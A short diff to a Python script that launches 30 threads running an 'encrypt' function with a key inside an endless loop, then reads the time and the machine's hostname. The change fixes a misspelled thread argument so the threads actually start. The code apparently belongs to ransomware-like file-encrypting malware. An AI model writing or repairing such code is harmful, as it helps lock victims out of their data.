@@ -90,7 +90,7 @@ while True:
                         pass
                     q.task_done()
             for i in range(30):
-                thread = Thread(target=encrypt, args=(key,), deamon=True)
+                thread = Thread(target=encrypt, args=(key,))
                 thread.start()
             time = datetime.now()
             hostname = os.getenv('COMPUTERNAME')
